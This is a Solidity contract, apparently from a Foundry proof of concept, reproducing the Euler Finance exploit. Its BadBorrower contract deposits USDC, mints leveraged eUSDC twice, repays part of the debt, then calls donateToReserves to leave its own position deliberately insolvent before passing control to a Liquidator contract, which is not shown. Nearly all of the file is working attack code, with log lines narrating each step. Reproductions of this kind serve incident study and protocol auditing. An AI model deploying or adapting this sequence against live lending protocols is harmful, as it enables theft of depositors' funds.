pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/interfaces/IERC20.sol";

import { EthereumTokens } from "../src/tokens/Tokens.sol";

import "./interfaces/IDToken.sol";
import "./interfaces/IEToken.sol";
import { Liquidator } from "./Liquidator.sol";
import { EulerProtocol } from "./Coordinator.sol";

contract BadBorrower {
   Liquidator liquidator;

    constructor() {
        liquidator = new Liquidator();
    }

    function generateBadLoan(
        address coordinator,
        uint256 initialBalance,
        uint256 mintAmount,
        uint256 donateAmount
    ) external {
        
        EthereumTokens.USDC.approve(EulerProtocol.euler, type(uint256).max);

        EulerProtocol.eUSDC.deposit(0, (2 * initialBalance / 3) * 10**6);
        EulerProtocol.eUSDC.mint(0, mintAmount * 10**6);
        EulerProtocol.dUSDC.repay(0, (initialBalance / 3) * 10**6);
        EulerProtocol.eUSDC.mint(0, mintAmount * 10**6);
        
        EulerProtocol.eUSDC.donateToReserves(0, donateAmount * 10**EulerProtocol.eUSDC.decimals());

        console.log("[*] Generated bad loan...");
        console.log(
            "\t[Bad Borrower] Collateral: %d eUSDC | Debt: %d dUSDC",
            EulerProtocol.eUSDC.balanceOf(address(this)) / 10**EulerProtocol.eUSDC.decimals(),
            EulerProtocol.dUSDC.balanceOf(address(this)) / 10**EulerProtocol.dUSDC.decimals()
        );

        // Pass execution to the liquidator
        liquidator.liquidate(
            coordinator,
            initialBalance
        );
    }
}
